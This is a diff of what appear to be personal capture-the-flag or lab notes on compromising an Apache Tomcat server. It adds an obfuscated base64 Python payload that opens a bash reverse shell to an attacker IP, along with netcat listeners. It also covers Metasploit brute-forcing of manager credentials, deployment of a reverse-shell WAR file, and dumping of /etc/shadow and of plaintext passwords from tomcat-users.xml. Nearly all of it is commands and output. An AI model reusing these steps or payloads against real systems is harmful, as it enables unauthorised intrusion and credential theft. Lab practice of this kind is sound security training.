@@ -19,7 +19,7 @@ __import__('os').popen('whoami').read();
 root
 
 PAYLOAD
-__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNDQuMTQ4LjIvNDQ0NCAwPiYxIgo=| base64 -d | bash")
+__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjMuMjAyLjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
 
 (hacker machine)
 nc -lvnp 4444
@@ -75,13 +75,54 @@ PORT     STATE SERVICE VERSION
 |_  Potentially risky methods: PUT DELETE
 |_http-server-header: Apache-Coyote/1.1
 
-
-*https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/*
-
+sudo nano /opt/tomcat/conf/tomcat-users.xml
 
 
+[+]GOBUSTER[+]
+/docs                 (Status: 302) [Size: 0] [--> /docs/]
+/examples             (Status: 302) [Size: 0] [--> /examples/]
+/manager              (Status: 302) [Size: 0] [--> /manager/] 
 
 
+[+]METASPLOIT[+]
+msfconsole
+[+]search  users credentials 
+use auxiliary/scanner/http/tomcat_mgr_login
+192.23.202.5:8080 - Login Successful: tomcat:s3cret
+
+[+]create revshell.war
+use exploit/multi/http/tomcat_mgr_upload
+
+[+]Upload file revshell.war on the target machine
+http://192.23.202.5:8080/manager/
+WAR file to deploy 
+Browse: revshell.war
+
+[+]hacker box
+nc -lvnp 80
+
+[+]execute payload
+http://192.23.202.5:8080/revshell/
+
+[+]get revershell and treatment tty
+
+cat /etc/shadow
+robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::
+
+tomcat@server3:~/conf$ pwd
+/opt/tomcat/conf
+
+tomcat@server3:~/conf$ tar xvf conf.tar.gz 
+
+tomcat@server3:~/conf/conf$ cat tomcat-users.xml 
+<tomcat-users>
+        <user username="tomcat" password="s3cret" roles="manager-gui,admin-gui"/>
+        <user username="robert" password="robert@1234567890!@#" roles="manager-gui,admin-gui
+
+su robert
+flag2
+
+[+]privilage escalation[+]
 
 
 
